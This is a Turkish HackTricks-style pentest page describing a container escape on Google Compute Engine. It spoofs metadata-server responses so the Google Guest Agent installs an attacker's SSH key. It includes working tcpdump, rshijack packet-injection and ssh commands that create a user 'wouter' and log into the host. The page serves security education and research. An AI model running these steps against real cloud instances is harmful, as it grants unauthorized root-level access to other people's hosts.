# GCP - Network Docker Escape

{{#include ../../../banners/hacktricks-training.md}}

## Başlangıç Durumu

Bu teknik belirtilen her iki raporda da, saldırganlar GCP tarafından yönetilen bir **Docker** konteyneri içinde **root** erişimi elde etmişlerdir; konteyner host ağına erişim sağlıyordu (ve **`CAP_NET_ADMIN`** ile **`CAP_NET_RAW`** yeteneklerine sahipti).

## Saldırı Açıklaması

Bir Google Compute Engine örneğinde, ağ trafiğinin düzenli incelenmesi `169.254.169.254` adresindeki **metadata instance**'a yapılan birçok **düz HTTP isteği** gösterir. [**Google Guest Agent**](https://github.com/GoogleCloudPlatform/guest-agent), açık kaynaklı bir servis olarak sık sık bu tür istekleri yapar.

Bu agent, **metadata'daki değişiklikleri izlemek** için tasarlanmıştır. Metadata özellikle **SSH public key** alanını içerir. Yeni bir public SSH anahtarı metadata'ya eklendiğinde, agent otomatik olarak bunu `.authorized_key` dosyasına **yetkilendirir**. Gerekirse **yeni bir kullanıcı** oluşturup onu **sudoers** listesine ekleyebilir.

Agent, tüm metadata değerlerini özyinelemeli olarak almak için bir istek göndererek değişiklikleri izler (`GET /computeMetadata/v1/?recursive=true`). Bu istek, metadata sunucusunun yalnızca son alımdan bu yana metadata'da bir değişiklik varsa yanıt göndermesini sağlamak için tasarlanmıştır; değişiklik, bir Etag ile tanımlanır (`wait_for_change=true&last_etag=`). Ayrıca bir **timeout** parametresi (`timeout_sec=`) bulunur. Belirtilen zaman aşımı içinde değişiklik olmazsa, sunucu **değişmemiş değerleri** döner.

Bu süreç, IMDS'nin (Instance Metadata Service) herhangi bir yapılandırma değişikliği yoksa **60 saniye** sonra yanıt vermesine izin verir; bu, guest agent'a gönderilecek sahte bir yapılandırma yanıtını enjekte etmek için bir boşluk yaratır.

Bir saldırgan bunu, IMDS sunucusundan gelen yanıtı taklit eden bir **Man-in-the-Middle (MitM) saldırısı** yaparak ve **yeni bir public key** ekleyerek kötüye kullanabilir. Bu, host'a yetkisiz SSH erişimi sağlayabilir.

### Escape Tekniği

Google Compute Engine ağlarında ARP spoofing etkisiz olsa da, [**Ezequiel**](https://www.ezequiel.tech/2020/08/dropping-shell-in.html) tarafından geliştirilen [**rshijack**](https://github.com/ezequielpereira/rshijack)'in değiştirilmiş bir versiyonu, iletişime paket enjeksiyonu yapmak ve SSH kullanıcısını enjekte etmek için kullanılabilir.

rshijack'in bu sürümü, ACK ve SEQ numaralarını komut satırı argümanları olarak girmeye izin verir; bu, gerçek Metadata sunucusu yanıtından önce bir yanıtı taklit etmeyi kolaylaştırır. Ayrıca, [**küçük bir Shell script**](https://gist.github.com/ezequielpereira/914c2aae463409e785071213b059f96c#file-fakedata-sh) özel olarak hazırlanmış bir payload döndürmek için kullanılır. Bu payload, Google Guest Agent'ın `.authorized_keys` dosyasına belirli bir public key ile `wouter` kullanıcısını **oluşturmasını** tetikler.

Script, Metadata sunucusunun farklı metadata değerlerini Google Guest Agent'a hemen bildirmesini engellemek için aynı ETag'i kullanır; böylece yanıt geciktirilir.

Spoofing'i gerçekleştirmek için şu adımlar gereklidir:

1. **Metadata sunucusuna olan istekleri izleyin** — **tcpdump** kullanarak:

<details>
<summary>Metadata sunucusu isteklerini tcpdump ile izle</summary>
```bash
tcpdump -S -i eth0 'host 169.254.169.254 and port 80' &
```
</details>

Aşağıdakine benzer bir satır arayın:

<details>
<summary>Örnek tcpdump çıktı satırı</summary>
```
<TIME> IP <LOCAL_IP>.<PORT> > 169.254.169.254.80: Flags [P.], seq <NUM>:<TARGET_ACK>, ack <TARGET_SEQ>, win <NUM>, length <NUM>: HTTP: GET /computeMetadata/v1/?timeout_sec=<SECONDS>&last_etag=<ETAG>&alt=json&recursive=True&wait_for_change=True HTTP/1.1
```
</details>

2. Doğru ETAG ile sahte metadata verisini rshijack'e gönder:

<details>
<summary>Sahte metadata gönder ve host'a SSH ile bağlan</summary>
```bash
fakeData.sh <ETAG> | rshijack -q eth0 169.254.169.254:80 <LOCAL_IP>:<PORT> <TARGET_SEQ> <TARGET_ACK>; ssh -i id_rsa -o StrictHostKeyChecking=no wouter@localhost
```
</details>

Bu adım public key'i yetkilendirir; ilgili private key ile SSH bağlantısını mümkün kılar.

## Referanslar

- [https://www.ezequiel.tech/2020/08/dropping-shell-in.html](https://www.ezequiel.tech/2020/08/dropping-shell-in.html)
- [https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)

{{#include ../../../banners/hacktricks-training.md}}
